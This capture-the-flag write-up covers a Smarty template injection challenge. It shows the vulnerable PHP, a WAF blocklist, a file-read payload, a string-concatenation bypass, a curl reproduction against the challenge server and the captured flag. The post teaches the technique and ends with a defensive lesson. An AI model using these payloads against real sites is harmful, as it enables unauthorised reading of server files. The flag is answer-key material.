---
title: "1337 Local CTF: Notebook — Smarty SSTI → WAF Bypass → File Read"
published: 2026-06-27
description: "Exploiting Smarty template injection and bypassing a substring WAF with string concatenation."
tags: [1337CTF, CTF, Web, SSTI, Smarty, WAFBypass]
category: CTF
image: ./cover.png
draft: false
---

# Notebook

## Challenge Context

Notebook was a PHP web challenge using Smarty templates. A comment preview feature rendered user-controlled text through Smarty's template engine.

## Reconnaissance

The vulnerable pattern was:

```php
$tpl_string = "<h3>Comment Preview:</h3><p>{$text}</p>";
$preview = $smarty->fetch('string:' . $tpl_string);
```

User input became part of a `string:` template, so Smarty syntax inside the input was evaluated server-side.

## Vulnerability / Core Idea

This is Server-Side Template Injection (SSTI). Smarty's `{fetch}` primitive can read files. The application tried to block dangerous strings with a WAF:

```php
'flag', '/etc', '$smarty', 'base64', 'include', 'require', ...
```

The WAF matched substrings before Smarty evaluated the expression.

## Exploitation

A direct payload was blocked:

```text
{fetch file="/flag.txt"}
```

The bypass was to concatenate the filename inside the template so the literal blocked word `flag` never appears in the HTTP request:

```text
{fetch file="/fla"|cat:"g.txt"}
```

Reproduction:

```bash
curl --noproxy '*' -sk -G 'http://104.199.105.242:4242/' \
  --data-urlencode 'action=preview' \
  --data-urlencode 'text={fetch file="/fla"|cat:"g.txt"}'
```

## Flag

```text
leet{sm4r7y_7pl_1nj3c710n_n0_w4f_c4n_s70p_m3}
```

## Lesson Learned

Blocklists fail against template languages because the language itself provides composition. Filter the capability, not the spelling.

---

Cover: [Wallhaven yqmlmx](https://wallhaven.cc/w/yqmlmx).
